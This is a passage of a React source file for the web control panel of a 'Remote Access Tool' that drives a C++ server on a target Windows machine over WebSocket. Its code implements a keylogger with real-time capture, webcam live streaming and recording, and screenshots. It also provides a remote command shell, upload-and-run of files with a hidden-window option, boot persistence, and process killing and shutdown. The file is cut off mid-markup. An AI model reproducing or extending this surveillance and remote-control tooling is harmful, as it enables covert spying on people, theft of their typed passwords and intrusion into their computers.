import React, { useState, useEffect } from 'react';
import './App.css';

const App = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [targetIP, setTargetIP] = useState('');
  const [wsPort, setWsPort] = useState('9002');
  const [isConnected, setIsConnected] = useState(false);
  const [ws, setWs] = useState(null);
  const [logs, setLogs] = useState([]);
  const [activeTab, setActiveTab] = useState('process');
  const [processInput, setProcessInput] = useState('');
  const [appInput, setAppInput] = useState('');
  
  // Media states
  const [screenshotData, setScreenshotData] = useState(null);
  const [webcamFrame, setWebcamFrame] = useState(null);
  const [isStreaming, setIsStreaming] = useState(false);
  const [recordingData, setRecordingData] = useState(null);
  const [isRecording, setIsRecording] = useState(false);
  const [recordCountdown, setRecordCountdown] = useState(0);
  const [isConverting, setIsConverting] = useState(false);
  
  // Process list state
  const [processList, setProcessList] = useState([]);
  
  // Keylogger states
  const [keylogMode, setKeylogMode] = useState('buffer'); // 'buffer' hoặc 'realtime'
  const [realtimeKeylog, setRealtimeKeylog] = useState('');
  const [bufferKeylog, setBufferKeylog] = useState('');
  
  // Auto-detect IP state
  const [isDetectingIP, setIsDetectingIP] = useState(false);
  
  // Custom Modal states
  const [modal, setModal] = useState({
    show: false,
    type: 'alert', // 'alert' or 'confirm'
    title: '',
    message: '',
    onConfirm: null
  });
  
  // CMD Terminal states
  const [cmdRunning, setCmdRunning] = useState(false);
  const [cmdOutput, setCmdOutput] = useState('');
  const [cmdInput, setCmdInput] = useState('');
  const [cmdShowWindow, setCmdShowWindow] = useState(false);
  const [uploadedFile, setUploadedFile] = useState(null);
  
  // Recording timer ref
  const recordingTimerRef = React.useRef(null);
  const [recordingStarted, setRecordingStarted] = useState(false);
  const [recordDuration, setRecordDuration] = useState(10);
  
  // Persistence state
  const [persistenceEnabled, setPersistenceEnabled] = useState(false);
  
  // Resize state
  const [logsPanelWidth, setLogsPanelWidth] = useState(420);

  // Load saved connection info from localStorage
  useEffect(() => {
    const savedIP = localStorage.getItem('targetIP');
    const savedPort = localStorage.getItem('wsPort');
    const savedWidth = localStorage.getItem('logsPanelWidth');
    
    if (savedIP) setTargetIP(savedIP);
    if (savedPort) setWsPort(savedPort);
    if (savedWidth) setLogsPanelWidth(parseInt(savedWidth));
  }, []);
  
  // Handle panel resize
  useEffect(() => {
    let isResizing = false;
    let startX = 0;
    let startWidth = 0;

    const handleMouseDown = (e) => {
      const resizeHandle = e.target.closest('.resize-handle');
      if (!resizeHandle) return;
      
      isResizing = true;
      startX = e.clientX;
      startWidth = logsPanelWidth;
      
      document.body.style.cursor = 'col-resize';
      document.body.style.userSelect = 'none';
      e.preventDefault();
    };

    const handleMouseMove = (e) => {
      if (!isResizing) return;
      e.preventDefault();
      
      const diff = startX - e.clientX;
      const newWidth = Math.max(300, Math.min(800, startWidth + diff));
      setLogsPanelWidth(newWidth);
    };

    const handleMouseUp = (e) => {
      if (isResizing) {
        isResizing = false;
        document.body.style.cursor = '';
        document.body.style.userSelect = '';
        e.preventDefault();
      }
    };

    document.addEventListener('mousedown', handleMouseDown);
    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);

    return () => {
      document.removeEventListener('mousedown', handleMouseDown);
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('mouseup', handleMouseUp);
    };
  }, []);
  
  // Save width to localStorage when it changes
  useEffect(() => {
    localStorage.setItem('logsPanelWidth', logsPanelWidth.toString());
  }, [logsPanelWidth]);

  // Start countdown when recording starts and camera becomes ready
  useEffect(() => {
    if (recordingStarted && isRecording) {
      // Clear any existing timer first
      if (recordingTimerRef.current) {
        clearInterval(recordingTimerRef.current);
      }
      
      addLog(`📹 Camera ready, starting ${recordDuration}-second countdown...`, 'success');
      
      let countdown = recordDuration;
      setRecordCountdown(countdown);
      
      recordingTimerRef.current = setInterval(() => {
        countdown--;
        setRecordCountdown(countdown);
        
        if (countdown <= 0) {
          clearInterval(recordingTimerRef.current);
          recordingTimerRef.current = null;
        }
      }, 1000);
      
      // Cleanup on unmount or when dependencies change
      return () => {
        if (recordingTimerRef.current) {
          clearInterval(recordingTimerRef.current);
          recordingTimerRef.current = null;
        }
      };
    }
  }, [recordingStarted, isRecording, recordDuration]);

  // Custom Alert/Confirm functions
  const showAlert = (title, message) => {
    setModal({
      show: true,
      type: 'alert',
      title,
      message,
      onConfirm: null
    });
  };

  const showConfirm = (title, message, onConfirm) => {
    setModal({
      show: true,
      type: 'confirm',
      title,
      message,
      onConfirm
    });
  };

  const closeModal = () => {
    setModal({ ...modal, show: false });
  };

  const handleModalConfirm = () => {
    if (modal.onConfirm) {
      modal.onConfirm();
    }
    closeModal();
  };

  // Thêm log vào danh sách
  const addLog = (message, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, { timestamp, message, type }]);
    // Auto-scroll logs
    setTimeout(() => {
      const logsContainer = document.querySelector('.logs-content');
      if (logsContainer) {
        logsContainer.scrollTop = logsContainer.scrollHeight;
      }
    }, 100);
  };

  // Auto-detect server IP on local network
  const handleAutoDetectIP = () => {
    setIsDetectingIP(true);
    // Try localhost first
    const wsUrl = `ws://127.0.0.1:9002`;
    const tempWs = new WebSocket(wsUrl);

    tempWs.onopen = () => {
      // Send GET_SERVER_IP command
      tempWs.send(JSON.stringify({ cmd: 'GET_SERVER_IP' }));
    };

    tempWs.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.type === 'SERVER_INFO') {
          setTargetIP(data.ip);
          setWsPort(data.port);
          setIsDetectingIP(false);
          showAlert('✅ Server Detected', `IP: ${data.ip}\nPort: ${data.port}`);
          tempWs.close();
        }
      } catch (e) {
        console.error('Parse error:', e);
      }
    };

    tempWs.onerror = () => {
      setIsDetectingIP(false);
      showAlert('❌ Detection Failed', 'Cannot detect server on localhost.\nPlease enter IP manually.');
      tempWs.close();
    };

    setTimeout(() => {
      if (tempWs.readyState !== WebSocket.CLOSED) {
        tempWs.close();
        setIsDetectingIP(false);
        showAlert('⏱️ Timeout', 'Server detection timeout.\nPlease enter IP manually.');
      }
    }, 3000);
  };

  // Kết nối WebSocket
  const handleConnect = () => {
    if (!targetIP) {
      showAlert('⚠️ Missing Information', 'Please enter IP address!');
      return;
    }

    // Save to localStorage
    localStorage.setItem('targetIP', targetIP);
    localStorage.setItem('wsPort', wsPort);

    try {
      const wsUrl = `ws://${targetIP}:${wsPort}`;
      const websocket = new WebSocket(wsUrl);

      websocket.onopen = () => {
        setIsConnected(true);
        setIsLoggedIn(true);
        addLog(`Connected successfully to ${wsUrl}`, 'success');
        
        // Đồng bộ keylog mode từ server ngay khi kết nối
        websocket.send(JSON.stringify({ cmd: 'SET_KEYLOG_MODE' }));
      };

      websocket.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          
          // Xử lý các loại response từ server
          if (data.type === 'ACTION_RESULT') {
            addLog(data.msg, 'info');
            
            // Đồng bộ keylog mode từ server response
            if (data.currentMode) {
              setKeylogMode(data.currentMode);
              console.log('Keylog mode synchronized:', data.currentMode);
            }
          } 
          else if (data.type === 'LIST_RESULT') {
            const processList = data.data;
            setProcessList(processList);
            let logMsg = `Received ${processList.length} processes`;
            addLog(logMsg, 'success');
          }
          else if (data.type === 'KEYLOG_RESULT') {
            setBufferKeylog(data.data);
            addLog(`Keylog received (${data.data.length} characters)`, 'success');
          }
          else if (data.type === 'KEYLOG_REALTIME') {
            // Real-time keylog data
            setRealtimeKeylog(prev => prev + data.data);
            // Auto-scroll keylog
            setTimeout(() => {
              const keylogRaw = document.querySelector('.keylog-output.raw');
              const keylogReadable = document.querySelector('.keylog-output.readable');
              if (keylogRaw) keylogRaw.scrollTop = keylogRaw.scrollHeight;
              if (keylogReadable) keylogReadable.scrollTop = keylogReadable.scrollHeight;
            }, 100);
          }
          else if (data.type === 'SERVER_INFO') {
            // Auto-detected server IP
            setTargetIP(data.ip);
            setWsPort(data.port);
            setIsDetectingIP(false);
            addLog(`Server IP detected: ${data.ip}:${data.port}`, 'success');
          }
          else if (data.type === 'CMD_OUTPUT') {
            // Real-time CMD output
            setCmdOutput(prev => prev + data.data);
            // Auto-scroll terminal output
            setTimeout(() => {
              const terminalContent = document.querySelector('.terminal-content');
              if (terminalContent) {
                terminalContent.scrollTop = terminalContent.scrollHeight;
              }
            }, 100);
          }
          else if (data.type === 'CMD_STATUS') {
            setCmdRunning(data.running);
            if (data.msg) {
              addLog(data.msg, 'info');
            }
          }
          else if (data.type === 'CMD_PROCESS_ENDED') {
            setCmdRunning(false);
            addLog(`Process ended with exit code: ${data.exitCode}`, 'info');
          }
          else if (data.type === 'SCREENSHOT_RESULT') {
            setScreenshotData(data.data);
            addLog('Screenshot received successfully! Check Media tab.', 'success');
          }
          else if (data.type === 'CAM_FRAME') {
            setWebcamFrame(data.data);
            
            // FALLBACK: If server doesn't support CAM_READY, use first frame as signal
            if (!isRecording) {
              addLog('Webcam frame updated', 'info');
            } else if (!recordingStarted) {
              // Trigger countdown start via state update
              setRecordingStarted(true);
            }
          }
          else if (data.type === 'CAM_READY') {
            // Camera is ready, start countdown (PREFERRED METHOD)
            addLog('📹 Received CAM_READY signal from server', 'success');
            setRecordingStarted(true);
          }
          else if (data.type === 'RECORD_RESULT') {
            // Clean up timer
            if (recordingTimerRef.current) {
              clearInterval(recordingTimerRef.current);
              recordingTimerRef.current = null;
            }
            
            setIsRecording(false);
            setRecordingStarted(false);
            setRecordCountdown(0);
            setIsConverting(true);
            addLog('Converting AVI video to MP4...', 'info');
            
            // Convert AVI to MP4
            fetch('/convert-video', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ video_data: data.data })
            })
            .then(res => res.json())
            .then(result => {
              setIsConverting(false);
              if (result.error) {
                addLog(`Conversion error: ${result.error}`, 'error');
                // Fallback: download AVI
                const link = document.createElement('a');
                link.href = 'data:video/avi;base64,' + data.data;
                link.download = `webcam_${Date.now()}.avi`;
                link.click();
                addLog('Downloaded AVI video (conversion failed)', 'warning');
              } else {
                setRecordingData(result.mp4_data);
                setIsStreaming(false);
                addLog('Video converted to MP4 successfully!', 'success');
              }
            })
            .catch(err => {
              setIsConverting(false);
              addLog(`API Error: ${err.message}`, 'error');
              // Fallback: download AVI
              const link = document.createElement('a');
              link.href = 'data:video/avi;base64,' + data.data;
              link.download = `webcam_${Date.now()}.avi`;
              link.click();
            });
          }
          else {
            addLog(`Nhận: ${JSON.stringify(data)}`, 'info');
          }
        } catch (error) {
          addLog(`JSON parse error: ${event.data}`, 'error');
        }
      };

      websocket.onerror = (error) => {
        addLog('WebSocket connection error', 'error');
        setIsConnected(false);
      };

      websocket.onclose = () => {
      // Clean up timer
      if (recordingTimerRef.current) {
        clearInterval(recordingTimerRef.current);
        recordingTimerRef.current = null;
      }
      
      setIsConnected(false);
      setIsLoggedIn(false);
      setIsStreaming(false);
      setWebcamFrame(null);
      setIsRecording(false);
      setRecordingStarted(false);
      setRecordCountdown(0);
      setIsConverting(false);
      addLog('Disconnected', 'warning');
    };      setWs(websocket);
    } catch (error) {
      addLog(`Lỗi: ${error.message}`, 'error');
    }
  };

  // Ngắt kết nối
  const handleDisconnect = () => {
    if (ws) {
      // Clean up timer
      if (recordingTimerRef.current) {
        clearInterval(recordingTimerRef.current);
        recordingTimerRef.current = null;
      }
      
      ws.close();
      setWs(null);
      setIsConnected(false);
      setIsLoggedIn(false);
      setIsStreaming(false);
      setWebcamFrame(null);
      setScreenshotData(null);
      setRecordingData(null);
      setIsRecording(false);
      setRecordingStarted(false);
      setRecordCountdown(0);
      setIsConverting(false);
      addLog('Disconnected', 'info');
    }
  };

  // Gửi lệnh
  const sendCommand = (cmd, args = {}) => {
    if (!isConnected || !ws) {
      addLog('Chưa kết nối tới server!', 'error');
      return;
    }
    
    // Tạo JSON object với cmd và các tham số
    const payload = { cmd, ...args };
    const jsonString = JSON.stringify(payload);
    
    ws.send(jsonString);
    addLog(`Gửi: ${cmd}`, 'success');
  };

  // Xóa logs
  const clearLogs = () => {
    setLogs([]);
  };

  // Kill process
  const handleKillProcess = () => {
    const target = processInput.trim();
    if (!target) {
      addLog('Please enter PID or process name!', 'error');
      return;
    }

    // Kiểm tra xem là số (PID) hay chữ (Tên tiến trình)
    if (/^\d+$/.test(target)) {
      sendCommand('KILL_PROC', { pid: target });
    } else {
      sendCommand('KILL_PROC', { proc_name: target });
    }
    setProcessInput('');
  };
  
  // Change keylog mode
  const handleKeylogModeChange = (mode) => {
    setKeylogMode(mode);
    sendCommand('SET_KEYLOG_MODE', { mode });
    
    if (mode === 'realtime') {
      setRealtimeKeylog('');
      addLog('Switched to Real-time Mode', 'success');
    } else {
      addLog('Switched to Buffer Mode', 'success');
    }
  };
  
  // Parse raw keylog to readable format
  const parseKeylogToReadable = (rawText) => {
    let readable = rawText;
    
    // Replace special keys with readable characters
    readable = readable.replace(/\[SPACE\]/g, ' ');
    readable = readable.replace(/\[ENTER\]/g, '\n');
    readable = readable.replace(/\[TAB\]/g, '\t');
    readable = readable.replace(/\[BS\]/g, '⌫');
    readable = readable.replace(/\[DEL\]/g, '⌦');
    
    // Remove other special key notations but keep combo keys
    readable = readable.replace(/\[ESC\]/g, '[ESC]');
    readable = readable.replace(/\[CAPSLOCK\]/g, '[CAPS]');
    readable = readable.replace(/\[F(\d+)\]/g, '[F$1]');
    readable = readable.replace(/\[(LEFT|RIGHT|UP|DOWN|HOME|END|PGUP|PGDN)\]/g, '[$1]');
    
    return readable;
  };
  
  // Clear keylog displays
  const clearKeylogDisplay = () => {
    setRealtimeKeylog('');
    setBufferKeylog('');
    addLog('Keylog display cleared', 'info');
  };

  // CMD Terminal functions
  const handleStartCmdSession = () => {
    setCmdOutput('');
    sendCommand('CMD_START', { showWindow: cmdShowWindow });
    addLog('Starting CMD session...', 'info');
  };

  const handleStopCmdSession = () => {
    sendCommand('CMD_STOP');
    addLog('Stopping CMD session...', 'info');
  };

  const handleKillCmdProcess = () => {
    showConfirm(
      '⚠️ Force Kill Process',
      'Are you sure you want to forcefully terminate the running process?',
      () => {
        sendCommand('CMD_KILL');
        addLog('Killing CMD process...', 'warning');
      }
    );
  };

  const handleSendCommand = () => {
    if (!cmdInput.trim() || !cmdRunning) return;
    
    sendCommand('CMD_EXEC', { command: cmdInput });
    setCmdOutput(prev => prev + `> ${cmdInput}\n`);
    setCmdInput('');
    // Auto-scroll terminal output
    setTimeout(() => {
      const terminalContent = document.querySelector('.terminal-content');
      if (terminalContent) {
        terminalContent.scrollTop = terminalContent.scrollHeight;
      }
    }, 100);
  };

  const handleClearCmdOutput = () => {
    setCmdOutput('');
    addLog('CMD output cleared', 'info');
  };

  const handleFileUpload = (event) => {
    const file = event.target.files[0];
    if (file) {
      setUploadedFile(file);
      addLog(`File selected: ${file.name}`, 'info');
    }
  };

  const handleRunUploadedFile = () => {
    if (!uploadedFile) {
      showAlert('⚠️ No File', 'Please upload a file first!');
      return;
    }

    // Read file as base64 and send via WebSocket
    const reader = new FileReader();
    reader.onload = (e) => {
      const base64Data = e.target.result.split(',')[1]; // Remove data:xxx;base64, prefix
      
      sendCommand('CMD_UPLOAD_RUN', {
        filename: uploadedFile.name,
        fileData: base64Data,
        showWindow: cmdShowWindow
      });
      
      addLog(`Uploading and running: ${uploadedFile.name}`, 'info');
    };
    
    reader.onerror = () => {
      showAlert('❌ File Read Error', 'Failed to read file');
    };
    
    reader.readAsDataURL(uploadedFile);
  };

  // Start app
  const handleStartApp = () => {
    const name = appInput.trim();
    if (!name) {
      addLog('Please enter application name!', 'error');
      return;
    }
    sendCommand('START_PROC', { name: name });
    addLog(`Launching: ${name}`, 'info');
    setAppInput('');
  };

  // Persistence toggle handler
  const handleTogglePersistence = () => {
    if (persistenceEnabled) {
      // Tắt persistence
      sendCommand('PERSISTENCE', { mode: 'OFF' });
      addLog('Disabling persistence...', 'info');
      setPersistenceEnabled(false);
    } else {
      // Bật persistence với confirm
      showConfirm(
        '⚠️ Enable Persistence',
        'Server will auto-start on system boot. Continue?',
        () => {
          sendCommand('PERSISTENCE', { mode: 'ON' });
          addLog('Enabling persistence...', 'info');
          setPersistenceEnabled(true);
        }
      );
    }
  };

  const handleKillServer = () => {
    showConfirm(
      '⛔ Kill Server',
      'This will terminate the server process. Are you sure?',
      () => {
        sendCommand('KILL_SERVER');
        addLog('Killing server...', 'warning');
      }
    );
  };

  // Download handlers
  const downloadScreenshot = () => {
    if (!screenshotData) return;
    const link = document.createElement('a');
    link.href = 'data:image/jpeg;base64,' + screenshotData;
    link.download = `screenshot_${Date.now()}.jpg`;
    link.click();
    addLog('Screenshot downloaded', 'success');
  };

  const downloadRecording = () => {
    if (!recordingData) return;
    const link = document.createElement('a');
    link.href = 'data:video/mp4;base64,' + recordingData;
    link.download = `recording_${Date.now()}.mp4`;
    link.click();
    addLog('MP4 video downloaded', 'success');
  };

  // Kill process by PID (quick action)
  const quickKillPID = (pid) => {
    showConfirm(
      '⚠️ Confirm Action',
      `Are you sure you want to kill process PID: ${pid}?`,
      () => {
        sendCommand('KILL_PROC', { pid: pid.toString() });
        addLog(`Killing PID: ${pid}`, 'info');
        // Auto refresh after 1 second
        setTimeout(() => {
          if (processList.length > 0) {
            sendCommand('LIST_PROC');
          }
        }, 1000);
      }
    );
  };

  // Kill process by name (quick action)
  const quickKillName = (name) => {
    showConfirm(
      '⚠️ Confirm Action',
      `Are you sure you want to kill ALL processes named: ${name}?`,
      () => {
        sendCommand('KILL_PROC', { proc_name: name });
        addLog(`Killing process: ${name}`, 'info');
        // Auto refresh after 1 second
        setTimeout(() => {
          if (processList.length > 0) {
            sendCommand('LIST_PROC');
          }
        }, 1000);
      }
    );
  };

  // Group processes by name
  const groupProcessesByName = () => {
    const grouped = {};
    processList.forEach(proc => {
      // Format: "Name | PID"
      const parts = proc.split(' | ');
      if (parts.length === 2) {
        const name = parts[0].trim();
        const pid = parts[1].trim();
        
        if (!grouped[name]) {
          grouped[name] = [];
        }
        grouped[name].push(pid);
      }
    });
    
    // Sắp xếp theo số lượng PID (nhiều nhất lên đầu)
    const sortedEntries = Object.entries(grouped).sort((a, b) => {
      return b[1].length - a[1].length;
    });
    
    return Object.fromEntries(sortedEntries);
  };

  // Start/Stop webcam stream
  const handleStartWebcam = () => {
    if (!isStreaming) {
      setIsStreaming(true);
      sendCommand('START_CAM');
      addLog('Starting webcam stream...', 'info');
    }
  };

  const handleStopWebcam = () => {
    if (isStreaming) {
      setIsStreaming(false);
      sendCommand('STOP_CAM');
      setWebcamFrame(null);
      addLog('Stopping webcam stream...', 'info');
    }
  };

  // Start recording with countdown
  const handleStartRecording = () => {
    if (isStreaming) {
      addLog('Please stop live stream before recording!', 'error');
      return;
    }
    
    if (recordDuration < 1 || recordDuration > 60) {
      showAlert('⚠️ Invalid Duration', 'Duration must be between 1 and 60 seconds!');
      return;
    }
    
    // Clear any existing timer
    if (recordingTimerRef.current) {
      clearInterval(recordingTimerRef.current);
      recordingTimerRef.current = null;
    }
    
    setIsRecording(true);
    setRecordingStarted(false);
    setRecordCountdown(recordDuration);
    sendCommand('RECORD_CAM', { duration: recordDuration });
    addLog('Starting camera for recording...', 'info');
  };

  return (
    <div className="app">
      {!isLoggedIn ? (
        // LOGIN PAGE
        <div className="login-container">
          <div className="login-box">
            <div className="login-header">
              <div className="login-icon">🔐</div>
              <h1>Remote Access Tool</h1>
              <p className="login-subtitle">Connect to remote computer</p>
            </div>

            <div className="login-form">
              <div className="form-group">
                <label>
                  <span className="label-icon">🌐</span>
                  Target IP Address
                </label>
                <div className="input-with-button">
                  <input
                    type="text"
                    value={targetIP}
                    onChange={(e) => setTargetIP(e.target.value)}
                    placeholder="Example: 192.168.1.100 or 10.217.40.76"
                    onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
                    autoFocus
                  />
                  <button 
                    onClick={handleAutoDetectIP} 
                    className="btn btn-detect"
                    disabled={isDetectingIP}
                    title="Auto-detect server on localhost"
                  >
                    {isDetectingIP ? '🔄' : '🔍'} {isDetectingIP ? 'Detecting...' : 'Auto'}
                  </button>
                </div>
              </div>

              <div className="form-group">
                <label>
                  <span className="label-icon">🔌</span>
                  WebSocket Port
                </label>
                <input
                  type="text"
                  value={wsPort}
                  onChange={(e) => setWsPort(e.target.value)}
                  placeholder="9002"
                  onKeyPress={(e) => e.key === 'Enter' && handleConnect()}
                />
              </div>

              <button onClick={handleConnect} className="btn btn-login">
                <span className="btn-icon">🚀</span>
                Connect Now
              </button>

              <div className="login-info">
                <p>💡 <strong>Note:</strong></p>
                <ul>
                  <li>Make sure C++ Server is running on target machine</li>
                  <li>IP and port must match server configuration</li>
                  <li>Connection info will be saved automatically</li>
                </ul>
              </div>
            </div>

            <div className="login-footer">
              <p>Built with React.js + Flask + WebSocket</p>
            </div>
          </div>
        </div>
      ) : (
        // MAIN DASHBOARD
        <>
          <header className="header">
            <h1>🖥️ Remote Access Tool - Web Client</h1>
            <div className="header-actions">
              <button 
                onClick={handleTogglePersistence} 
                className={`btn ${persistenceEnabled ? 'btn-persist-on' : 'btn-persist-off'}`}
                disabled={!isConnected}
                title={persistenceEnabled ? "Disable auto-start" : "Enable auto-start on system boot"}
              >
                {persistenceEnabled ? '🔒' : '🔓'}
                <span className="btn-text">{persistenceEnabled ? ' Persist ON' : ' Persist OFF'}</span>
              </button>
              <button 
                onClick={handleKillServer} 
                className="btn btn-kill-server"
                disabled={!isConnected}
                title="Terminate server process"
              >
                ⛔<span className="btn-text"> Kill Server</span>
              </button>
              <div className="connection-info">
                <span className="connection-badge">
                  <span className={`status-indicator ${isConnected ? 'connected' : 'disconnected'}`}></span>
                  {targetIP}:{wsPort}
                </span>
              </div>
              <button onClick={handleDisconnect} className="btn btn-logout">
                🚪<span className="btn-text"> Logout</span>
              </button>
            </div>
          </header>

          <div className="main-container">
            {/* Control Panel */}
            <div className="control-panel">
              <div className="tabs">
            <button
              className={`tab ${activeTab === 'process' ? 'active' : ''}`}
              onClick={() => setActiveTab('process')}
            >
              ⚙️ Process Management
            </button>
            <button
              className={`tab ${activeTab === 'system' ? 'active' : ''}`}
              onClick={() => setActiveTab('system')}
            >
              🖥️ System
            </button>
            <button
              className={`tab ${activeTab === 'media' ? 'active' : ''}`}
              onClick={() => setActiveTab('media')}
            >
              📸 Media
            </button>
            <button
              className={`tab ${activeTab === 'keylogger' ? 'active' : ''}`}
              onClick={() => setActiveTab('keylogger')}
            >
              ⌨️ Keylogger
            </button>
            <button
              className={`tab ${activeTab === 'terminal' ? 'active' : ''}`}
              onClick={() => setActiveTab('terminal')}
            >
              💻 CMD Terminal
            </button>
          </div>

          <div className="tab-content">
            {activeTab === 'process' && (
              <div className="command-section">
                <h3>Process Management</h3>
                
                {/* Kill and Start Process - Horizontal Layout */}
                <div className="process-actions-row">
                  <div className="section-group half-width">
                    <h4>❌ Kill Process</h4>
                    <div className="input-group">
                      <input
                        type="text"
                        value={processInput}
                        onChange={(e) => setProcessInput(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleKillProcess()}
                        placeholder="Enter PID (number) or process name (e.g., notepad.exe)"
                        disabled={!isConnected}
                      />
                      <button 
                        onClick={handleKillProcess} 
                        className="btn btn-danger"
                        disabled={!isConnected}
                      >
                        Kill Process
                      </button>
                    </div>
                    <p className="help-text">
                      💡 Enter number for PID, or name for process name
                    </p>
                  </div>

                  <div className="section-group half-width">
                    <h4>▶️ Launch Application</h4>
                    <div className="input-group">
                      <input
                        type="text"
                        value={appInput}
                        onChange={(e) => setAppInput(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleStartApp()}
                        placeholder="Enter app name (e.g., notepad, calc, www.google.com)"
                        disabled={!isConnected}
                      />
                      <button 
                        onClick={handleStartApp} 
                        className="btn btn-success"
                        disabled={!isConnected}
                      >
                        Launch
                      </button>
                    </div>
                    <p className="help-text">
                      💡 Supports: app name (notepad), file path, or URL (www.google.com)
                    </p>
                  </div>
                </div>

                {/* Process List - Below */}
                <div className="section-group">
                  <h4>📋 Process List</h4>
                  <button 
                    onClick={() => {
                      sendCommand('LIST_PROC');
                      addLog('Fetching process list...', 'info');
                    }} 
                    className="btn btn-command"
                    disabled={!isConnected}
                  >
                    🔄 Get Process List
                  </button>
                  
                  {processList.length > 0 && (
                    <div className="process-list-container">
                      <div className="process-list-header">
                        <span>Found {processList.length} processes</span>
                        <button 
                          onClick={() => setProcessList([])} 
                          className="btn btn-small"
                        >
                          ✖ Close
                        </button>
                      </div>
                      <div className="process-groups">
                        {Object.entries(groupProcessesByName()).map(([name, pids]) => (
                          <div key={name} className="process-group">
                            <div className="process-group-header">
                              <div className="process-name">
                                <span className="process-icon">📦</span>
                                <strong>{name}</strong>
                                <span className="process-count">({pids.length})</span>
                              </div>
                              <button 
                                onClick={() => quickKillName(name)}
                                className="btn btn-kill-group"
                                title={`Kill all ${name}`}
                              >
                                ❌ Kill All
                              </button>
                            </div>
                            <div className="process-pids">
                              {pids.map(pid => (
                                <div key={pid} className="process-pid-item">
                                  <span className="pid-label">PID: {pid}</span>
                                  <button 
                                    onClick={() => quickKillPID(pid)}
                                    className="btn btn-kill-pid"
                                    title={`Kill PID ${pid}`}
                                  >
                                    ✖
                                  </button>
                                </div>
                              ))}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {activeTab === 'system' && (
              <div className="command-section">
                <h3>System Management</h3>
                <div className="command-buttons">
                  <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'LOCK' })} className="btn btn-command">
                    Lock Computer 🔒
                  </button>
                  <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'SHUTDOWN' })} className="btn btn-danger">
                    Shutdown
                  </button>
                  <button onClick={() => sendCommand('SYSTEM_CONTROL', { type: 'RESTART' })} className="btn btn-danger">
                    Restart
                  </button>
                </div>
              </div>
            )}

            {activeTab === 'media' && (
              <div className="command-section">
                <h3>Media Control</h3>
                
                {/* Screenshot Section */}
                <div className="section-group">
                  <h4>📸 Screenshot</h4>
                  <button 
                    onClick={() => {
                      sendCommand('SCREENSHOT');
                      addLog('Requesting screenshot...', 'info');
                    }} 
                    className="btn btn-command"
                    disabled={!isConnected}
                  >
                    Take Screenshot
                  </button>
                  
                  {screenshotData && (
                    <div className="media-preview">
                      <img 
                        src={`data:image/jpeg;base64,${screenshotData}`} 
                        alt="Screenshot" 
                        className="preview-image"
                      />
                      <div className="preview-actions">
                        <button onClick={downloadScreenshot} className="btn btn-success">
                          💾 Download Image
                        </button>
                        <button 
                          onClick={() => setScreenshotData(null)} 
                          className="btn btn-small"
                        >
                          ✖ Close
                        </button>
                      </div>
                    </div>
                  )}
                </div>

                {/* Webcam Section */}
                <div className="section-group">
                  <h4>📹 Webcam Live Stream</h4>
                  <div className="command-buttons">
                    <button 
                      onClick={handleStartWebcam} 
                      className="btn btn-command"
                      disabled={!isConnected || isStreaming}
                    >
                      ▶️ Start Live Stream
                    </button>
                    <button 
                      onClick={handleStopWebcam} 
                      className="btn btn-danger"
                      disabled={!isConnected || !isStreaming}
                    >
                      ⏹️ Stop Live Stream
                    </button>
                  </div>
                  
                  {isStreaming && webcamFrame && (
                    <div className="media-preview">
                      <div className="stream-badge">🔴 LIVE</div>
                      <img 
                        src={`data:image/jpeg;base64,${webcamFrame}`} 
                        alt="Webcam Stream" 
                        className="preview-image stream"
                      />
                    </div>
                  )}
                  
                  {isStreaming && !webcamFrame && (
                    <div className="media-preview">
                      <div className="loading-placeholder">
                        <div className="spinner"></div>
                        <p>Waiting for webcam stream...</p>
                      </div>
                    </div>
                  )}
                </div>

                {/* Recording Section */}
                <div className="section-group">
                  <h4>🎥 Webcam Recording</h4>
                  <div className="recording-controls">
                    <div className="duration-input-group">
                      <label>Duration (seconds):</label>
                      <input
                        type="number"
                        min="1"
                        max="60"
                        value={recordDuration}
                        onChange={(e) => setRecordDuration(parseInt(e.target.value) || 10)}
                        disabled={isRecording}
                        className="duration-input"
                      />
                    </div>
                    <button 
                      onClick={handleStartRecording}
                      className="btn btn-command"
                      disabled={!isConnected || isStreaming || isRecording}
                    >
                      {isRecording ? `🎬 Recording... (${recordCountdown}s)` : `🎬 Record ${recordDuration}s`}
                    </button>
                  </div>
                  
                  {isRecording && (
                    <div className="recording-progress">
                      <div className="progress-bar">
                        <div 
                          className="progress-fill" 
                          style={{width: `${((recordDuration - recordCountdown) / recordDuration) * 100}%`}}
                        ></div>
                      </div>
                      <p className="recording-text">
                        ⏱️ Recording... {recordCountdown} seconds remaining
                      </p>
                    </div>
                  )}
                  
                  {isConverting && (
                    <div className="recording-progress">
                      <div className="spinner"></div>
                      <p className="recording-text">
                        🔄 Converting video to MP4...
                      </p>
                    </div>
                  )}
                  
                  {recordingData && !isRecording && !isConverting && (
                    <div className="media-preview">
                      <h4>📹 Recorded Video Preview</h4>
                      <video 
                        controls 
                        autoPlay
                        muted
                        loop
                        className="preview-video"
                        key={recordingData}
                      >
                        <source 
                          src={`data:video/mp4;base64,${recordingData}`} 
                          type="video/mp4"
                        />
                        Your browser doesn't support video playback.
                      </video>
                      <div className="preview-actions">
                        <button onClick={downloadRecording} className="btn btn-success">
                          💾 Download MP4
                        </button>
                        <button 
                          onClick={() => setRecordingData(null)} 
                          className="btn btn-danger"
                        >
                          🗑️ Delete
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {activeTab === 'keylogger' && (
              <div className="command-section">
                <h3>Keylogger</h3>
                
                {/* Mode Selection */}
                <div className="keylog-mode-selector">
                  <label>Mode:</label>
                  <div className="mode-buttons">
                    <button 
                      onClick={() => handleKeylogModeChange('buffer')}
                      className={`btn btn-mode ${keylogMode === 'buffer' ? 'active' : ''}`}
                    >
